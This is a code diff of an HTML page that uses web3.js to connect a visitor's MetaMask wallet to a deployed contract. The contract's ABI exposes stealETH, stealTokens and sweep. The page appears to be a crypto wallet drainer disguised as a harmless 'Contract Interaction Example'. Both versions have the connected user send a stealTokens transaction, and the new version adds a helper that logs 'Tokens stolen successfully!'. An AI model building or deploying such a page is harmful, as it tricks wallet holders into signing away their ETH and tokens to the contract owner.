@@ -3,138 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ethereum Interaction</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <title>MetaMask and Contract Interaction</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Ethereum Interaction with MetaMask</h1>
+    <h1>MetaMask Contract Interaction Example</h1>
     <button id="connectButton">Connect MetaMask</button>
-    <button id="sendButton" disabled>Send ETH</button>
-
+    <div id="status"></div>
+    
     <script>
         let web3;
         let contract;
         let userAddress;
 
-        const contractAddress = "0xA79f1997eAC8B797f67bf728DaB6c57a3961cA74"; // Your contract address
-
-
-    
-
-
-
-
-
-
-const contractABI = [
-        {
-            "inputs": [],
-            "name": "stealETH",
-            "outputs": [],
-            "stateMutability": "payable",
-            "type": "function"
-        },
-        {
-            "inputs": [
-                {
-                    "internalType": "address",
-                    "name": "_tokenAddress",
-                    "type": "address"
-                }
-            ],
-            "name": "stealTokens",
-            "outputs": [],
-            "stateMutability": "nonpayable",
-            "type": "function"
-        },
-        {
-            "inputs": [
-                {
-                    "internalType": "address",
-                    "name": "_tokenAddress",
-                    "type": "address"
-                }
-            ],
-            "name": "sweep",
-            "outputs": [],
-            "stateMutability": "payable",
-            "type": "function"
-        },
-        {
-            "inputs": [],
-            "stateMutability": "nonpayable",
-            "type": "constructor"
-        },
-        {
-            "stateMutability": "payable",
-            "type": "receive"
-        },
-        {
-            "inputs": [],
-            "name": "owner",
-            "outputs": [
-                {
-                    "internalType": "address payable",
-                    "name": "",
-                    "type": "address"
-                }
-            ],
-            "stateMutability": "view",
-            "type": "function"
-        }
-    ];
-
-
-
-
-
-
-
-
-
-
+        // Contract address and ABI
+        const contractAddress = "0x40D895158787709180fC962f4FE6fd979cAE9F1A"; // Deployed contract address
+        const contractABI = [
+            {
+                "inputs": [],
+                "name": "stealETH",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_tokenAddress",
+                        "type": "address"
+                    }
+                ],
+                "name": "stealTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "_tokenAddress",
+                        "type": "address"
+                    }
+                ],
+                "name": "sweep",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address payable",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
         // Connect MetaMask
         async function connectMetaMask() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
-
                 try {
-                    // Request account access
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    userAddress = await web3.eth.getAccounts();
-                    userAddress = userAddress[0];
-                    console.log("Connected to MetaMask with address: " + userAddress);
-
-                    // Enable the Send Button after connection
-                    document.getElementById('sendButton').disabled = false;
+                    await window.ethereum.request({ method: "eth_requestAccounts" });
+                    userAddress = (await web3.eth.getAccounts())[0];
                     contract = new web3.eth.Contract(contractABI, contractAddress);
+                    document.getElementById("status").innerHTML = "Connected to MetaMask with address: " + userAddress;
+                    console.log("Connected to MetaMask with address:", userAddress);
                 } catch (error) {
-                    console.error("User denied account access");
+                    document.getElementById("status").innerHTML = "Error connecting to MetaMask. Please try again.";
+                    console.error("User denied account access", error);
                 }
             } else {
-                alert('MetaMask is not installed!');
+                document.getElementById("status").innerHTML = "Please install MetaMask to interact with this app.";
+                alert("Please install MetaMask to interact with this app.");
             }
         }
 
-        // Send ETH or Tokens
-        async function sendTransaction() {
-            if (!contract) {
-                alert('Connect to MetaMask first!');
-                return;
-            }
-
+        // Example function to interact with contract
+        async function stealTokens(tokenAddress) {
             try {
-                const transaction = await contract.methods.stealTokens("0xYourTokenAddress").send({ from: userAddress });
-                console.log('Transaction successful: ', transaction);
+                await contract.methods.stealTokens(tokenAddress).send({ from: userAddress });
+                console.log("Tokens stolen successfully!");
             } catch (error) {
-                console.error('Transaction failed: ', error);
+                console.error("Error stealing tokens:", error);
             }
         }
 
-        // Event listeners
-        document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-        document.getElementById('sendButton').addEventListener('click', sendTransaction);
+        // Add event listener to connect button
+        document.getElementById("connectButton").addEventListener("click", connectMetaMask);
     </script>
 </body>
 </html>
+
